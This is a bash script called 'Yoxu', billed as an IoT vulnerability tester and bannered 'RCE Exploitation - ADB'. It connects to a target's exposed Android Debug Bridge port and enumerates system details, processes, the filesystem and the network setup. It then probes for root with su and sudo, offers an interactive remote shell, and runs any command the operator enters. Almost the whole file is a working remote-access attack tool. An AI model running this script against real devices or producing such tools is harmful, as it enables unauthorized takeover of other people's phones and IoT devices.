#!/bin/bash

# Yoxu - IoT Vulnerability Testing Script using ADB
# Usage: ./yoxu.sh <ip:port>

# ANSI color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
PINK='\033[95m'
NC='\033[0m' # No Color

# Check if ADB is installed
check_adb() {
  if ! command -v adb &> /dev/null; then
    echo -e "${RED}Error: ADB is not installed. Please install Android Debug Bridge first.${NC}"
    exit 1
  fi
}

# Check if arguments are provided
if [ $# -eq 0 ]; then
  echo -e "${RED}Error: No target specified.${NC}"
  echo -e "Usage: $0 <ip:port>"
  exit 1
fi

# Extract IP and port
TARGET=$1

# Welcome message
echo """
██╗░░░██╗░█████╗░██╗░░██╗██╗░░░██╗
╚██╗░██╔╝██╔══██╗╚██╗██╔╝██║░░░██║
░╚████╔╝░██║░░██║░╚███╔╝░██║░░░██║ RCE Exploitation - ADB
░░╚██╔╝░░██║░░██║░██╔██╗░██║░░░██║
░░░██║░░░╚█████╔╝██╔╝╚██╗╚██████╔╝
░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝░╚═════╝░
"""
echo -e "${NC}Target: ${TARGET}${NC}"
echo -e "${NC}Time: $(date)${NC}"
echo -e "${PINK}===============================================${NC}"

# Check ADB installation
check_adb

# Kill existing ADB server
echo -e "${YELLOW}Stopping any existing ADB server...${NC}"
adb kill-server 2>/dev/null
sleep 1

# Start ADB server
echo -e "${YELLOW}Starting ADB server...${NC}"
adb start-server 2>/dev/null
sleep 1

# Connect to the target device
echo -e "${YELLOW}Attempting to connect to ${TARGET}...${NC}"
CONNECT_RESULT=$(adb connect "$TARGET" 2>&1)
echo "$CONNECT_RESULT"

# Check if the connection was successful
if [[ "$CONNECT_RESULT" == *"connected to"* ]]; then
  echo -e "${GREEN}Connection successful!${NC}"
  
  # Get basic device info using universal commands
  echo -e "${YELLOW}Getting device information...${NC}"
  
  # Try to get system information with multiple commands for compatibility
  echo -e "\n${YELLOW}System information:${NC}"
  SYS_INFO=$(adb -s "$TARGET" shell "uname -a || cat /proc/version || echo 'System info not available'" 2>&1)
  echo "$SYS_INFO"
  
  # Try to detect Android or other OS
  echo -e "\n${YELLOW}Detecting OS type:${NC}"
  if adb -s "$TARGET" shell "ls /system" &> /dev/null; then
    echo -e "${GREEN}Android-based system detected${NC}"
    # Try Android-specific commands
    echo -e "\n${YELLOW}Android device information (if available):${NC}"
    adb -s "$TARGET" shell "getprop ro.product.model 2>/dev/null || echo 'Model info not available'"
    adb -s "$TARGET" shell "getprop ro.build.version.release 2>/dev/null || echo 'Version info not available'"
  else
    echo -e "${YELLOW}Non-Android system or custom IoT firmware detected${NC}"
  fi
  
  # List processes - using different commands for compatibility
  echo -e "\n${YELLOW}Running processes:${NC}"
  PROCESSES=$(adb -s "$TARGET" shell "ps 2>/dev/null || ps aux 2>/dev/null || top -n 1 2>/dev/null || echo 'Process listing not available'")
  echo "$PROCESSES" | head -10
  
  # Check for common directories
  echo -e "\n${YELLOW}Checking filesystem structure:${NC}"
  adb -s "$TARGET" shell "ls -la / 2>/dev/null || echo 'Cannot list root directory'"
  
  # Check network configuration
  echo -e "\n${YELLOW}Network configuration:${NC}"
  adb -s "$TARGET" shell "ifconfig 2>/dev/null || ip addr 2>/dev/null || echo 'Network info not available'"
  
  # Check for root access with multiple methods
  echo -e "\n${YELLOW}Checking for root access...${NC}"
  ROOT_TEST=$(adb -s "$TARGET" shell "su -c 'id' 2>/dev/null || sudo id 2>/dev/null || id 2>/dev/null")
  if [[ "$ROOT_TEST" == *"uid=0"* ]]; then
    echo -e "${GREEN}Root access is available!${NC}"
  else
    echo -e "${RED}Root access not available or requires different method${NC}"
  fi
  
  # Interactive shell option
  echo -e "\n${YELLOW}Do you want to open an interactive shell? (y/n)${NC}"
  read -r SHELL_CHOICE
  if [[ "$SHELL_CHOICE" == "y" || "$SHELL_CHOICE" == "Y" ]]; then
    echo -e "${GREEN}Opening interactive shell to ${TARGET}...${NC}"
    echo -e "${GREEN}Type 'exit' to quit the shell.${NC}"
    adb -s "$TARGET" shell
  fi
  
  # Execute custom command option
  echo -e "\n${YELLOW}Do you want to execute a custom command? (y/n)${NC}"
  read -r CMD_CHOICE
  if [[ "$CMD_CHOICE" == "y" || "$CMD_CHOICE" == "Y" ]]; then
    echo -e "${YELLOW}Enter command to execute:${NC}"
    read -r CUSTOM_CMD
    echo -e "${GREEN}Executing: ${CUSTOM_CMD}${NC}"
    adb -s "$TARGET" shell "$CUSTOM_CMD"
  fi
  
else
  echo -e "${RED}Failed to connect to ${TARGET}${NC}"
  echo -e "${YELLOW}Possible reasons:${NC}"
  echo -e "1. Device is not reachable (check network)"
  echo -e "2. ADB service is not running on target"
  echo -e "3. ADB service is not accepting connections on specified port"
  echo -e "4. Firewall is blocking the connection"
fi

# Disconnect and clean up
echo -e "\n${YELLOW}Disconnecting from device...${NC}"
adb disconnect "$TARGET"

echo -e "${PINK}===============================================${NC}"
echo -e "${PINK}Scan completed at $(date)${NC}"
echo -e "${PINK}===============================================${NC}"
